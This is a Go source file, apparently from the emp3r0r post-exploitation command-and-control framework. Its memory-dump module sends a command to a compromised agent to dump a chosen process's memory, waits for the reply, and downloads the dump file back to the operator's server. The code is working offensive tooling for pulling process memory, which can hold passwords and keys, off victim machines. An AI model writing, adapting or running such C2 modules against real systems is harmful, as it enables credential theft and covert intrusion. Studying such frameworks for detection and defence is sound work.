package modules

import (
	"fmt"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/agent_util"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/def"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/server"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func moduleMemDump() {
	pidOpt, ok := def.AvailableModuleOptions["pid"]
	if !ok {
		logging.Errorf("Option 'pid' not found")
		return
	}
	cmd := fmt.Sprintf("%s --pid %s", emp3r0r_def.C2CmdMemDump, pidOpt.Val)
	cmd_id := uuid.NewString()
	err := agent_util.SendCmd(cmd, cmd_id, def.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	logging.Printf("Please wait for agent's response...")

	var cmd_res string
	for i := 0; i < 100; i++ {
		// check if the command has finished
		res, ok := def.CmdResults[cmd_id] // check if the command has finished
		if ok {
			cmd_res = res
			def.CmdResultsMutex.Lock()
			delete(def.CmdResults, cmd_id)
			def.CmdResultsMutex.Unlock()
			break
		}
		time.Sleep(100 * time.Millisecond)
	}
	path := cmd_res
	if path == "" || strings.HasPrefix(path, "Error") {
		logging.Errorf("Failed to get memdump file path: invalid response")
		return
	}

	_, err = server.GetFile(path, def.ActiveAgent)
	if err != nil {
		logging.Errorf("GetFile: %v", err)
		return
	}
}
